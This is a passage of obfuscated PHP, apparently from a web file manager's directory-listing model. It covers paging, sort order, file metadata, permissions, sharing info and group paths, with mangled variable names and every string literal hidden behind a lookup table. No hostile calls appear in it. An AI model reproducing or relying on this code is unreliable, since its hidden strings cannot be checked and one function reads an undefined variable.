$ŞÖ¥›¯¥[$’İ©œ±Ì[501]] = array($’İ©œ±Ì[464], $’İ©œ±Ì[12]); } if (isset($ŞÖ¥›¯¥[$’İ©œ±Ì[190]])) { $ŞÖ¥›¯¥[$’İ©œ±Ì[190]] = intval($ŞÖ¥›¯¥[$’İ©œ±Ì[190]]); } $Üìõİ†¨ = $’İ©œ±Ì[521]; $†ğÅÒ‚„ = $this->field($Üìõİ†¨)->_makeOrder()->where($ŞÖ¥›¯¥)->selectPage($ÂîîÙø); $this->_listPageCheck($†ğÅÒ‚„, $Üìõİ†¨, $ŞÖ¥›¯¥); $this->_listDataApply($†ğÅÒ‚„[$’İ©œ±Ì[446]], $†Ú×êƒâ); $this->_listMake($†ğÅÒ‚„); return $†ğÅÒ‚„; } private function _listPageCheck(&$¹Ó³ºÑ·, $§ƒ½Ğ÷¯, $©’Ù³õ) { $ğÏ±™ =& $_SERVER[¹Éµ„ºå]; if (!is_array($¹Ó³ºÑ·[$ğÏ±™[443]])) { return; } $Õáæ”üæ = $¹Ó³ºÑ·[$ğÏ±™[443]]; if ($Õáæ”üæ[$ğÏ±™[445]] <= 1) { return; } if ($Õáæ”üæ[$ğÏ±™[444]] >= 100000) { return; } if (Model($ğÏ±™[522])->get($ğÏ±™[523]) != $ğÏ±™[524]) { return; } $§ƒ½Ğ÷¯ = str_replace(array($ğÏ±™[53], $ğÏ±™[417], $ğÏ±™[285]), $ğÏ±™[12], $§ƒ½Ğ÷¯); $§ƒ½Ğ÷¯ = $ğÏ±™[525] . str_replace($ğÏ±™[50], $ğÏ±™[526], $§ƒ½Ğ÷¯) . $ğÏ±™[527]; $ÔŞ·¥Úó = $ğÏ±™[528]; $ÔŞ·¥Úó = $ÔŞ·¥Úó . $ğÏ±™[529]; $ŞÒ§üîò = $Õáæ”üæ[$ğÏ±™[439]] * ($Õáæ”üæ[$ğÏ±™[428]] - 1) . $ğÏ±™[50] . $Õáæ”üæ[$ğÏ±™[439]]; $ä¸¯Õ‚ú = $this->_makeOrder(!0); $á‡¨éšˆ = $ğÏ±™[525] . str_replace($ğÏ±™[50], $ğÏ±™[526], $ä¸¯Õ‚ú[0]); if (strpos($á‡¨éšˆ, $ğÏ±™[530])) { $á‡¨éšˆ = str_replace($ğÏ±™[530], $ğÏ±™[531], $á‡¨éšˆ); } else { $á‡¨éšˆ .= $ğÏ±™[532] . $ä¸¯Õ‚ú[1]; } $Œé©“¦İ = array(); foreach ($©’Ù³õ as $®ªÏá¨• => $Ö¶›‹) { $Œé©“¦İ[$ğÏ±™[525] . $®ªÏá¨•] = $Ö¶›‹; } $this->alias($ğÏ±™[533])->field($§ƒ½Ğ÷¯)->limit($ŞÒ§üîò)->order($á‡¨éšˆ); $ã¶÷—²È = $this->join($ÔŞ·¥Úó)->where($Œé©“¦İ)->select(); if ($ã¶÷—²È) { $¹Ó³ºÑ·[$ğÏ±™[446]] = $ã¶÷—²È; } } protected function _makeOrder($áÑ¤µ—´ = false) { $Ê†Ó‹ô =& $_SERVER[¹Éµ„ºå]; $†âîı¹× = Model($Ê†Ó‹ô[534])->get($Ê†Ó‹ô[535]); $ºÓÕëø = Model($Ê†Ó‹ô[534])->get($Ê†Ó‹ô[536]); $€·ññ×¼ = array($Ê†Ó‹ô[537] => $Ê†Ó‹ô[538], $Ê†Ó‹ô[539] => $Ê†Ó‹ô[540]); $¸ÎÚ‚  = array($Ê†Ó‹ô[32] => $Ê†Ó‹ô[32], $Ê†Ó‹ô[79] => $Ê†Ó‹ô[79], $Ê†Ó‹ô[166] => $Ê†Ó‹ô[501], $Ê†Ó‹ô[541] => $Ê†Ó‹ô[541], $Ê†Ó‹ô[542] => $Ê†Ó‹ô[543], $Ê†Ó‹ô[231] => $Ê†Ó‹ô[231], $Ê†Ó‹ô[88] => $Ê†Ó‹ô[88]); $Ü±¤ñåÃ = Input::get($Ê†Ó‹ô[544], $Ê†Ó‹ô[7], $†âîı¹×, array_keys($¸ÎÚ‚ )); $çëûĞú¯ = Input::get($Ê†Ó‹ô[545], $Ê†Ó‹ô[7], $ºÓÕëø, array_keys($€·ññ×¼)); if (!in_array($Ü±¤ñåÃ, array_keys($¸ÎÚ‚ ))) { $Ü±¤ñåÃ = $Ê†Ó‹ô[32]; } if (!in_array($çëûĞú¯, array_keys($€·ññ×¼))) { $Ü±¤ñåÃ = $Ê†Ó‹ô[537]; } if ($Ü±¤ñåÃ == $Ê†Ó‹ô[32]) { } $æŸ¸™– = $Ê†Ó‹ô[546] . $¸ÎÚ‚ [$Ü±¤ñåÃ] . $Ê†Ó‹ô[53] . $€·ññ×¼[$çëûĞú¯]; $æŸ¸™– = rtrim(trim($æŸ¸™–), $Ê†Ó‹ô[50]); if ($áÑ¤µ—´) { return array($æŸ¸™–, $€·ññ×¼[$çëûĞú¯]); } return $this->order($æŸ¸™–); } protected function _listDataApplyItem($Êö¼ÓóÄ, $¢õÂèÖÅ = false) { $­ŒÇ¢û‡ = array($Êö¼ÓóÄ); $this->_listDataApply($­ŒÇ¢û‡, $¢õÂèÖÅ); return $­ŒÇ¢û‡[0]; } protected function _listDataApply(&$÷ÇâÃ¯, $”†”ì = false) { $‰Ù¡ƒï‚ =& $_SERVER[¹Éµ„ºå]; if (!$÷ÇâÃ¯) { $÷ÇâÃ¯ = array(); return; } $«É†êê† = array_to_keyvalue($÷ÇâÃ¯, $‰Ù¡ƒï‚[12], $‰Ù¡ƒï‚[191]); $«É†êê† = array_unique($«É†êê†); $«É†êê† = array_to_int($«É†êê†); $this->_listSourceCache($÷ÇâÃ¯); if (!$”†”ì) { $this->_listAppendMeta($÷ÇâÃ¯, $«É†êê†); $this->_listAppendFileMeta($÷ÇâÃ¯, $«É†êê†); $this->_listAppendChildren($÷ÇâÃ¯, $«É†êê†); } $this->_listAppendPath($÷ÇâÃ¯); $this->_listAppendAuth($÷ÇâÃ¯); $this->_listAppendSourceInfo($÷ÇâÃ¯, $«É†êê†); $this->_listAppendUser($÷ÇâÃ¯); $this->_listFilterInfo($÷ÇâÃ¯, $”†”ì); $this->_listAppendAuthSecret($÷ÇâÃ¯); } protected function _listSourceCache($ò÷Ç½—) { $—Û°¼‹ =& $_SERVER[¹Éµ„ºå]; foreach ($ò÷Ç½— as $ØÚ”¥…î) { self::$cacheSourceInfo[$—Û°¼‹[547] . $ØÚ”¥…î[$—Û°¼‹[191]]] = $ØÚ”¥…î; } } protected function _listFilterInfo(&$Ğ‹Ò‘, $Ãº±Õùù = false) { $Ñü¼ƒÏÃ =& $_SERVER[¹Éµ„ºå]; foreach ($Ğ‹Ò‘ as &$Ñ™ïŞªû) { $Ñ™ïŞªû = $this->pathInfoFilter($Ñ™ïŞªû); self::$cachePathInfo[$Ñü¼ƒÏÃ[548] . intval($Ãº±Õùù) . $Ñü¼ƒÏÃ[476] . $Ñ™ïŞªû[$Ñü¼ƒÏÃ[191]]] = $Ñ™ïŞªû; } unset($Ñ™ïŞªû); } protected function _listMake(&$ÁçÛˆå¥) { $é“÷¶á© =& $_SERVER[¹Éµ„ºå]; $ÁçÛˆå¥[$é“÷¶á©[85]] = array(); $ÁçÛˆå¥[$é“÷¶á©[86]] = array(); foreach ($ÁçÛˆå¥[$é“÷¶á©[446]] as $ÀüÉ…æ·) { $Îåé’Èµ = $ÀüÉ…æ·[$é“÷¶á©[500]] == 1 ? $é“÷¶á©[85] : $é“÷¶á©[86]; $ÁçÛˆå¥[$Îåé’Èµ][] = $ÀüÉ…æ·; } unset($ÁçÛˆå¥[$é“÷¶á©[446]]); } protected function _listAppendMeta(&$ùîÕ‚İì, $ò¼®Ë£Ó) { $Ş’¢Ã¶ë =& $_SERVER[¹Éµ„ºå]; $Û²ï©¡ = array($Ş’¢Ã¶ë[506] => array($Ş’¢Ã¶ë[507], $ò¼®Ë£Ó)); $‹¡€¼êƒ = Model($Ş’¢Ã¶ë[549])->field($Ş’¢Ã¶ë[550])->where($Û²ï©¡)->select(); if (!$‹¡€¼êƒ) { return; } $½ÒÙñ” = array($Ş’¢Ã¶ë[551], $Ş’¢Ã¶ë[552], $Ş’¢Ã¶ë[531]); $Ã€“×î = array(); foreach ($‹¡€¼êƒ as $ëøõÑÕ‡) { if (!isset($Ã€“×î[$ëøõÑÕ‡[$Ş’¢Ã¶ë[191]]])) { $Ã€“×î[$ëøõÑÕ‡[$Ş’¢Ã¶ë[191]]] = array(); } if (in_array($ëøõÑÕ‡[$Ş’¢Ã¶ë[95]], $½ÒÙñ”)) { continue; } if ($ëøõÑÕ‡[$Ş’¢Ã¶ë[95]] == $Ş’¢Ã¶ë[553]) { $ëøõÑÕ‡[$Ş’¢Ã¶ë[451]] = $Ş’¢Ã¶ë[554]; } $Ã€“×î[$ëøõÑÕ‡[$Ş’¢Ã¶ë[191]]][$ëøõÑÕ‡[$Ş’¢Ã¶ë[95]]] = $ëøõÑÕ‡[$Ş’¢Ã¶ë[451]]; } foreach ($ùîÕ‚İì as &$‹Ó»†„¨) { $‹Ó»†„¨[$Ş’¢Ã¶ë[555]] = !1; if (isset($Ã€“×î[$‹Ó»†„¨[$Ş’¢Ã¶ë[191]]])) { $‹Ó»†„¨[$Ş’¢Ã¶ë[555]] = $Ã€“×î[$‹Ó»†„¨[$Ş’¢Ã¶ë[191]]]; } if ($this->fileIsLock($‹Ó»†„¨) && $‹Ó»†„¨[$Ş’¢Ã¶ë[502]]) { $ößæ¯Æ– = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $‹Ó»†„¨[$Ş’¢Ã¶ë[502]][$Ş’¢Ã¶ë[503]] = AuthModel::authDisable($‹Ó»†„¨[$Ş’¢Ã¶ë[502]][$Ş’¢Ã¶ë[503]], $ößæ¯Æ–); $‹Ó»†„¨[$Ş’¢Ã¶ë[502]][$Ş’¢Ã¶ë[556]][$Ş’¢Ã¶ë[502]] = $‹Ó»†„¨[$Ş’¢Ã¶ë[502]][$Ş’¢Ã¶ë[503]]; } } unset($‹Ó»†„¨); } protected function _listAppendFileMeta(&$ÓŒ¹ëâ¤, $À‹Ú€ºÄ) { $Êß›Š =& $_SERVER[¹Éµ„ºå]; $ÄïÏÅ¡¾ = array_to_keyvalue($ÓŒ¹ëâ¤, $Êß›Š[12], $Êß›Š[557]); $ÄïÏÅ¡¾ = array_filter(array_unique($ÄïÏÅ¡¾)); $ÄïÏÅ¡¾ = array_to_int($ÄïÏÅ¡¾); if (!$ÄïÏÅ¡¾) { return; } $ŸÓØ¥Ñ = array($Êß›Š[558] => array($Êß›Š[507], $ÄïÏÅ¡¾)); $û¶úíè… = $Êß›Š[559]; $ÛÔ¾¿šÄ = Model($Êß›Š[560])->field($û¶úíè…)->where($ŸÓØ¥Ñ)->select(); $ÛÔ¾¿šÄ = array_to_keyvalue($ÛÔ¾¿šÄ, $Êß›Š[557]); $–¡»½ıî = Model($Êß›Š[561])->field($Êß›Š[562])->where($ŸÓØ¥Ñ)->select(); $–¡»½ıî = $–¡»½ıî ? $–¡»½ıî : array(); $˜ˆº·ÒŞ = array(); foreach ($–¡»½ıî as $ÓİÛÓ˜¬) { if (!isset($˜ˆº·ÒŞ[$ÓİÛÓ˜¬[$Êß›Š[557]]])) { $˜ˆº·ÒŞ[$ÓİÛÓ˜¬[$Êß›Š[557]]] = array(); } $˜ˆº·ÒŞ[$ÓİÛÓ˜¬[$Êß›Š[557]]][$ÓİÛÓ˜¬[$Êß›Š[95]]] = $ÓİÛÓ˜¬[$Êß›Š[451]]; } foreach ($ÓŒ¹ëâ¤ as &$ß‰šÀ¾÷) { $»ú…úÉ¿ = $ß‰šÀ¾÷[$Êß›Š[557]]; if (!$»ú…úÉ¿ || !is_array($ÛÔ¾¿šÄ[$»ú…úÉ¿])) { continue; } $ÒÙ¥º®¦ = $ÛÔ¾¿šÄ[$»ú…úÉ¿]; $ÒÙ¥º®¦[$Êß›Š[79]] = $ß‰šÀ¾÷[$Êß›Š[79]]; $ÒÙ¥º®¦[$Êß›Š[32]] = $ß‰šÀ¾÷[$Êß›Š[32]]; if (!$ÒÙ¥º®¦[$Êß›Š[563]]) { Model($Êß›Š[560])->fileMd5Check($ÒÙ¥º®¦); } if (!isset(self::$cacheFileInfo[$Êß›Š[564] . $»ú…úÉ¿])) { self::$cacheFileInfo[$Êß›Š[564] . $»ú…úÉ¿] = array_merge(array(), $ÒÙ¥º®¦); } unset($ÛÔ¾¿šÄ[$»ú…úÉ¿][$Êß›Š[87]]); $Ë£ËÃì = isset($˜ˆº·ÒŞ[$»ú…úÉ¿]) && is_array($˜ˆº·ÒŞ[$»ú…úÉ¿]) ? $˜ˆº·ÒŞ[$»ú…úÉ¿] : array(); $ß‰šÀ¾÷[$Êß›Š[167]] = array_merge($Ë£ËÃì, $ÛÔ¾¿šÄ[$»ú…úÉ¿]); if (isset($ß‰šÀ¾÷[$Êß›Š[167]][$Êß›Š[182]])) { $ß‰šÀ¾÷[$Êß›Š[182]] = json_decode($ß‰šÀ¾÷[$Êß›Š[167]][$Êß›Š[182]], !0); unset($ß‰šÀ¾÷[$Êß›Š[167]][$Êß›Š[182]]); } } unset($ß‰šÀ¾÷); } protected function _listAppendSourceInfo(&$±Ì´•ğ¸, $ôÌ°ˆŞÓ) { $ö¥¤ßş’ =& $_SERVER[¹Éµ„ºå]; $ïÑ‡Ë¶µ = Model($ö¥¤ßş’[565])->listData(); $È× ½×œ = Model($ö¥¤ßş’[514])->listData(); $ÓŠ®òèû = Model($ö¥¤ßş’[504])->listData(); $†şğµİ = Model($ö¥¤ßş’[566])->listSimple(); $¬‡ÂÌò = array_to_keyvalue($ïÑ‡Ë¶µ, $ö¥¤ßş’[487]); $ûÓ¯ÎŸ• = array_to_keyvalue_group($È× ½×œ, $ö¥¤ßş’[87], $ö¥¤ßş’[515]); $ùµôÇ‘Å = array_to_keyvalue($ÓŠ®òèû, $ö¥¤ßş’[87]); $•šÓù—§ = array_to_keyvalue_group($†şğµİ, $ö¥¤ßş’[191]); foreach ($±Ì´•ğ¸ as &$šÄ«§±) { $šÄ«§±[$ö¥¤ßş’[90]] = array($ö¥¤ßş’[567] => 0, $ö¥¤ßş’[568] => 0, $ö¥¤ßş’[569] => 0); if (isset($ùµôÇ‘Å[$šÄ«§±[$ö¥¤ßş’[191]]])) { $šÄ«§±[$ö¥¤ßş’[90]][$ö¥¤ßş’[570]] = 1; $šÄ«§±[$ö¥¤ßş’[90]][$ö¥¤ßş’[571]] = $ùµôÇ‘Å[$šÄ«§±[$ö¥¤ßş’[191]]][$ö¥¤ßş’[32]]; } if ($ûÓ¯ÎŸ• && $¬‡ÂÌò && isset($ûÓ¯ÎŸ•[$šÄ«§±[$ö¥¤ßş’[191]]])) { $šÄ«§±[$ö¥¤ßş’[90]][$ö¥¤ßş’[572]] = array(); foreach ($ûÓ¯ÎŸ•[$šÄ«§±[$ö¥¤ßş’[191]]] as $–ñâ¨Ïñ) { $ûİ¯š¾Ò = $¬‡ÂÌò[$–ñâ¨Ïñ]; $šÄ«§±[$ö¥¤ßş’[90]][$ö¥¤ßş’[572]][] = array($ö¥¤ßş’[573] => $ûİ¯š¾Ò[$ö¥¤ßş’[487]], $ö¥¤ßş’[509] => $ûİ¯š¾Ò[$ö¥¤ßş’[32]], $ö¥¤ßş’[574] => $ûİ¯š¾Ò[$ö¥¤ßş’[575]]); } } if ($•šÓù—§ && isset($•šÓù—§[$šÄ«§±[$ö¥¤ßş’[191]]])) { $šÄ«§±[$ö¥¤ßş’[90]][$ö¥¤ßş’[576]] = array(); foreach ($•šÓù—§[$šÄ«§±[$ö¥¤ßş’[191]]] as $ä˜ğâŞ‰) { $šÄ«§±[$ö¥¤ßş’[90]][$ö¥¤ßş’[576]] = $this->shareFilterShow($ä˜ğâŞ‰); } } } unset($šÄ«§±); return $±Ì´•ğ¸; } protected function shareFilterShow($‚ŸÖ°ÃÒ) { $ë‹ŒÍª¸ =& $_SERVER[¹Éµ„ºå]; if (!$‚ŸÖ°ÃÒ) { return $‚ŸÖ°ÃÒ; } $ŸÙ”ª¨Î = $ë‹ŒÍª¸[577]; if ($‚ŸÖ°ÃÒ[$ë‹ŒÍª¸[578]] == $ë‹ŒÍª¸[91]) { $ŸÙ”ª¨Î .= $ë‹ŒÍª¸[579]; } if (is_array($‚ŸÖ°ÃÒ[$ë‹ŒÍª¸[580]]) && is_array($‚ŸÖ°ÃÒ[$ë‹ŒÍª¸[580]][$ë‹ŒÍª¸[581]])) { $‚ŸÖ°ÃÒ[$ë‹ŒÍª¸[580]][$ë‹ŒÍª¸[581]] = $ë‹ŒÍª¸[582]; } if (!$œ¦½®ÀÌ[$ë‹ŒÍª¸[583]] && $œ¦½®ÀÌ[$ë‹ŒÍª¸[191]] != $ë‹ŒÍª¸[228]) { $œ¦½®ÀÌ[$ë‹ŒÍª¸[583]] = KodIO::make($œ¦½®ÀÌ[$ë‹ŒÍª¸[191]]); } $‚ŸÖ°ÃÒ = array_field_key($‚ŸÖ°ÃÒ, explode($ë‹ŒÍª¸[50], $ŸÙ”ª¨Î)); return $‚ŸÖ°ÃÒ; } protected function _listAppendChildren(&$·÷Öè¥À, $‰çÛı½Ü) { $›úïß·Û =& $_SERVER[¹Éµ„ºå]; $ïÔÙŠ¼Õ = array(); $Şî©©ñ¹ = array($›úïß·Û[239] => 0, $›úïß·Û[240] => 0); foreach ($·÷Öè¥À as &$—Îõ”Œ›) { if (!$—Îõ”Œ›[$›úïß·Û[500]]) { continue; } $ïÔÙŠ¼Õ[] = intval($—Îõ”Œ›[$›úïß·Û[191]]); } unset($—Îõ”Œ›); if (!$ïÔÙŠ¼Õ) { return; } $Ûş’»¾Ë = array($›úïß·Û[190] => array($›úïß·Û[7], $ïÔÙŠ¼Õ), $›úïß·Û[520] => 0); $ğµÓ…ş¯ = array($›úïß·Û[190], $›úïß·Û[500], $›úïß·Û[584] => $›úïß·Û[585]); $†ÑôÍ¹Ó = $this->field($ğµÓ…ş¯)->where($Ûş’»¾Ë)->group($›úïß·Û[586])->select(); $¾ğø…ıâ = array(); foreach ($†ÑôÍ¹Ó as $¼«”äËı) { $‚Áû = $¼«”äËı[$›úïß·Û[190]]; $¿Ğİƒå = $¼«”äËı[$›úïß·Û[500]] == $›úïß·Û[91] ? $›úïß·Û[240] : $›úïß·Û[239]; if (!isset($¾ğø…ıâ[$‚Áû])) { $¾ğø…ıâ[$‚Áû] = array($›úïß·Û[239] => 0, $›úïß·Û[240] => 0); } $¾ğø…ıâ[$‚Áû][$¿Ğİƒå] += $¼«”äËı[$›úïß·Û[585]]; } foreach ($·÷Öè¥À as &$—Îõ”Œ›) { if (!$—Îõ”Œ›[$›úïß·Û[500]]) { continue; } $¤Ø¾Û± = is_array($¾ğø…ıâ[$—Îõ”Œ›[$›úïß·Û[191]]]) ? $¾ğø…ıâ[$—Îõ”Œ›[$›úïß·Û[191]]] : $Şî©©ñ¹; $—Îõ”Œ›[$›úïß·Û[240]] = $¤Ø¾Û±[$›úïß·Û[240]]; $—Îõ”Œ›[$›úïß·Û[239]] = $¤Ø¾Û±[$›úïß·Û[239]]; unset($—Îõ”Œ›[$›úïß·Û[501]]); } unset($—Îõ”Œ›); } protected function _listAppendAuth(&$°ÄËªÉ) { $ø…Õ£‡ =& $_SERVER[¹Éµ„ºå]; $Æô”êòÒ = array(); foreach ($°ÄËªÉ as $€ŞûÙßÜ) { if ($€ŞûÙßÜ[$ø…Õ£‡[188]] == self::TYPE_GROUP) { $Æô”êòÒ[] = intval($€ŞûÙßÜ[$ø…Õ£‡[191]]); } } if (!$Æô”êòÒ) { return; } $Îİä­ïÎ = array_to_keyvalue($°ÄËªÉ, $ø…Õ£‡[191]); $åèı÷Ë¿ = Model($ø…Õ£‡[587])->getSourceList($Æô”êòÒ, $Îİä­ïÎ); $˜Ã¾÷ší = KodUser::isRoot(); foreach ($°ÄËªÉ as $üù•Ôßñ => &$€ŞûÙßÜ) { $€ŞûÙßÜ[$ø…Õ£‡[502]] = $åèı÷Ë¿[$€ŞûÙßÜ[$ø…Õ£‡[191]]]; if (!$€ŞûÙßÜ[$ø…Õ£‡[502]] && $€ŞûÙßÜ[$ø…Õ£‡[188]] == self::TYPE_GROUP) { $€ŞûÙßÜ[$ø…Õ£‡[502]] = Action($ø…Õ£‡[588])->pathGroupAuthMake($€ŞûÙßÜ[$ø…Õ£‡[589]]); if (!$€ŞûÙßÜ[$ø…Õ£‡[502]] && !$˜Ã¾÷ší) { $€ŞûÙßÜ[$ø…Õ£‡[233]] = !1; $€ŞûÙßÜ[$ø…Õ£‡[232]] = !1; } } if ($€ŞûÙßÜ[$ø…Õ£‡[502]]) { $€ŞûÙßÜ[$ø…Õ£‡[233]] = AuthModel::authCheckEdit($€ŞûÙßÜ[$ø…Õ£‡[502]][$ø…Õ£‡[503]]); $€ŞûÙßÜ[$ø…Õ£‡[232]] = AuthModel::authCheckView($€ŞûÙßÜ[$ø…Õ£‡[502]][$ø…Õ£‡[503]]); } $this->groupPathDisplay($€ŞûÙßÜ); } unset($€ŞûÙßÜ); } public function _listAppendAuthSecret(&$óàöğÒÁ) { $×ŞÒ¾ =& $_SERVER[¹Éµ„ºå]; if (Model($×ŞÒ¾[522])->get($×ŞÒ¾[590]) != $×ŞÒ¾[91]) { return; } static $àş“õ€Õ = false; if (!$àş“õ€Õ) { $¨„ºóÖƒ = Model($×ŞÒ¾[591]); $ÂÑøù½© = Model($×ŞÒ¾[592]); $àş“õ€Õ = $ÂÑøù½©->listData(); $àş“õ€Õ = array_to_keyvalue($àş“õ€Õ, $×ŞÒ¾[191]); $’Ñí¡û = json_decode(Model($×ŞÒ¾[522])->get($×ŞÒ¾[593]), !0); $’Ñí¡û = array_to_keyvalue($’Ñí¡û, $×ŞÒ¾[487]); foreach ($àş“õ€Õ as $²¯÷– => $ å®ê) { $ÙàİßáĞ = $’Ñí¡û[$ å®ê[$×ŞÒ¾[594]]]; if (!$ÙàİßáĞ) { $ÂÑøù½©->remove($ å®ê[$×ŞÒ¾[487]]); unset($àş“õ€Õ[$²¯÷–]); continue; } $Œö°æåø = $¨„ºóÖƒ->listData($ÙàİßáĞ[$×ŞÒ¾[502]]); if (!$Œö°æåø) { $ÂÑøù½©->remove($ å®ê[$×ŞÒ¾[487]]); unset($àş“õ€Õ[$²¯÷–]); continue; } $ å®ê[$×ŞÒ¾[502]] = $Œö°æåø; $ å®ê[$×ŞÒ¾[595]] = $ÙàİßáĞ; $ å®ê[$×ŞÒ¾[596]] = Model($×ŞÒ¾[597])->getInfoSimpleOuter($ å®ê[$×ŞÒ¾[541]]); $àş“õ€Õ[$²¯÷–] = $ å®ê; } } $†¤Áëíà = USER_ID; $À’äïÂÉ = array(); $‰–Ô¨°Œ = $this->_listAppendPath($À’äïÂÉ, !0); foreach ($óàöğÒÁ as $²¯÷– => &$ å®ê) { if (!is_array($ å®ê[$×ŞÒ¾[502]])) { continue; } if ($ å®ê[$×ŞÒ¾[188]] != $×ŞÒ¾[598]) { continue; } if (isset($àş“õ€Õ[$ å®ê[$×ŞÒ¾[191]]])) { $‰½Ñ“÷¿ = $àş“õ€Õ[$ å®ê[$×ŞÒ¾[191]]]; if (!is_array($ å®ê[$×ŞÒ¾[555]])) { $ å®ê[$×ŞÒ¾[555]] = array(); } $ å®ê[$×ŞÒ¾[555]][$×ŞÒ¾[599]] = $‰½Ñ“÷¿[$×ŞÒ¾[594]]; $ å®ê[$×ŞÒ¾[502]][$×ŞÒ¾[600]] = $‰½Ñ“÷¿; $ å®ê[$×ŞÒ¾[502]][$×ŞÒ¾[601]] = $ å®ê[$×ŞÒ¾[602]]; $ å®ê[$×ŞÒ¾[502]][$×ŞÒ¾[603]] = $×ŞÒ¾[91]; if ($‰½Ñ“÷¿[$×ŞÒ¾[541]] != $†¤Áëíà) { $ å®ê[$×ŞÒ¾[502]][$×ŞÒ¾[503]] = $ å®ê[$×ŞÒ¾[502]][$×ŞÒ¾[503]] & $‰½Ñ“÷¿[$×ŞÒ¾[502]][$×ŞÒ¾[502]]; } continue; } $‰­ø‹ê = $this->parentLevelArray($ å®ê[$×ŞÒ¾[604]]); $ÍŒ§›Ô‰ = array_reverse($‰­ø‹ê); foreach ($ÍŒ§›Ô‰ as $öòòÄƒ£ => $İüİÌÍİ) { if (!isset($àş“õ€Õ[$İüİÌÍİ])) { continue; } $‰½Ñ“÷¿ = $àş“õ€Õ[$İüİÌÍİ]; $ å®ê[$×ŞÒ¾[502]][$×ŞÒ¾[600]] = $‰½Ñ“÷¿; if ($‰½Ñ“÷¿[$×ŞÒ¾[541]] != $†¤Áëíà) { $ å®ê[$×ŞÒ¾[502]][$×ŞÒ¾[503]] = $ å®ê[$×ŞÒ¾[502]][$×ŞÒ¾[503]] & $‰½Ñ“÷¿[$×ŞÒ¾[502]][$×ŞÒ¾[502]]; } $È•›ñ‚› = $×ŞÒ¾[12]; $ÔëŸø©î = count($‰­ø‹ê) - $öòòÄƒ£; for ($”‰Ê•§ï = 0; $”‰Ê•§ï < $ÔëŸø©î; $”‰Ê•§ï++) { if (!isset($‰–Ô¨°Œ[$‰­ø‹ê[$”‰Ê•§ï]])) { $È•›ñ‚› = $×ŞÒ¾[12]; break; } $È•›ñ‚› = $È•›ñ‚› . rtrim($‰–Ô¨°Œ[$‰­ø‹ê[$”‰Ê•§ï]], $×ŞÒ¾[8]) . $×ŞÒ¾[8]; } $ å®ê[$×ŞÒ¾[502]][$×ŞÒ¾[601]] = rtrim($È•›ñ‚›, $×ŞÒ¾[8]) . $×ŞÒ¾[8]; break; } } unset($ å®ê); } public function groupPathDisplay(&$ şĞã‰) { $Ç¬î˜  =& $_SERVER[¹Éµ„ºå]; if ($ şĞã‰[$Ç¬î˜ [188]] != self::TYPE_GROUP) { return; } $ıì‡¾êï = Model($Ç¬î˜ [605])->getInfo($ şĞã‰[$Ç¬î˜ [589]]); $‡ÜÃæ”« = $this->parentLevelArray($ıì‡¾êï[$Ç¬î˜ [604]]); $Ş“ÓÅÀ‰ = $Ç¬î˜ [12]; foreach ($‡ÜÃæ”« as $¿¤Ô¡·€) { $ğ½÷Şó = Model($Ç¬î˜ [605])->getInfo($¿¤Ô¡·€); $Ş“ÓÅÀ‰ .= $ğ½÷Şó[$Ç¬î˜ [90]][$Ç¬î˜ [191]] . $Ç¬î˜ [50]; } $ şĞã‰[$Ç¬î˜ [606]] = $ıì‡¾êï[$Ç¬î˜ [190]]; $ şĞã‰[$Ç¬î˜ [607]] = $ıì‡¾êï[$Ç¬î˜ [604]]; $ şĞã‰[$Ç¬î˜ [608]] = $ıì‡¾êï[$Ç¬î˜ [609]]; $ şĞã‰[$Ç¬î˜ [610]] = $Ş“ÓÅÀ‰ . $ıì‡¾êï[$Ç¬î˜ [90]][$Ç¬î˜ [191]]; } protected function _listAppendPath(&$Ëš™şä¶, $Ÿéˆ˜äó = false) { $êŠŒÃòØ =& $_SERVER[¹Éµ„ºå]; static $úúöıâ = array(); $‡”÷§¶Ê = array(); $îá‡Ÿ¡» = array(); if ($Ÿéˆ˜äó) { return $úúöıâ; } foreach ($Ëš™şä¶ as &$şÅ¯¶ˆ’) { $„…€ŞÏ = $şÅ¯¶ˆ’[$êŠŒÃòØ[191]]; if ($şÅ¯¶ˆ’[$êŠŒÃòØ[500]] == $êŠŒÃòØ[91] && $şÅ¯¶ˆ’[$êŠŒÃòØ[190]] != 0) { $úúöıâ[$„…€ŞÏ] = $şÅ¯¶ˆ’[$êŠŒÃòØ[32]]; } if ($şÅ¯¶ˆ’[$êŠŒÃòØ[500]] == $êŠŒÃòØ[91] && $şÅ¯¶ˆ’[$êŠŒÃòØ[190]] == 0) { $úúöıâ[$„…€ŞÏ] = $this->_listAppendPathRoot($şÅ¯¶ˆ’, array()); } if (isset($îá‡Ÿ¡»[$şÅ¯¶ˆ’[$êŠŒÃòØ[604]]])) { continue; } $îá‡Ÿ¡»[$şÅ¯¶ˆ’[$êŠŒÃòØ[604]]] = !0; $›ÒÈÙÎÓ = $this->parentLevelArray($şÅ¯¶ˆ’[$êŠŒÃòØ[604]]); foreach ($›ÒÈÙÎÓ as $é›Öñ”Å => $†ÏÃàŞ) { if (isset($úúöıâ[$†ÏÃàŞ])) { continue; } if ($é›Öñ”Å == 0) { $úúöıâ[$†ÏÃàŞ] = $this->_listAppendPathRoot($şÅ¯¶ˆ’, $›ÒÈÙÎÓ); } if ($é›Öñ”Å != 0) { $‡”÷§¶Ê[] = $†ÏÃàŞ; } } } unset($şÅ¯¶ˆ’); $‡”÷§¶Ê = array_unique($‡”÷§¶Ê); if (count($‡”÷§¶Ê) > 0) { $üÎÜ³•û = array($êŠŒÃòØ[506] => array($êŠŒÃòØ[507], $‡”÷§¶Ê)); if (count($‡”÷§¶Ê) == 1) { $†­ãÕé› = $this->sourceInfo($‡”÷§¶Ê[0]); $Ö¥šÃÓ» = is_array($†­ãÕé›) ? array($†­ãÕé›) : !1; } else { $Ö¥šÃÓ» = $this->field($êŠŒÃòØ[611])->where($üÎÜ³•û)->select(); } if (!$Ö¥šÃÓ») { $Ö¥šÃÓ» = array(); } foreach ($Ö¥šÃÓ» as $ë©·•¡¨) { $úúöıâ[$ë©·•¡¨[$êŠŒÃòØ[191]]] = $ë©·•¡¨[$êŠŒÃòØ[32]]; } } $‹§µôÊ† = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $í‡‹üœ¿ = array(); foreach ($Ëš™şä¶ as &$şÅ¯¶ˆ’) { $½ıƒáÒ = $şÅ¯¶ˆ’[$êŠŒÃòØ[604]]; $¡ÔÀ˜ï¸ = $êŠŒÃòØ[12]; if (isset($í‡‹üœ¿[$½ıƒáÒ])) { $¡ÔÀ˜ï¸ = $í‡‹üœ¿[$½ıƒáÒ]; } else { $›ÒÈÙÎÓ = 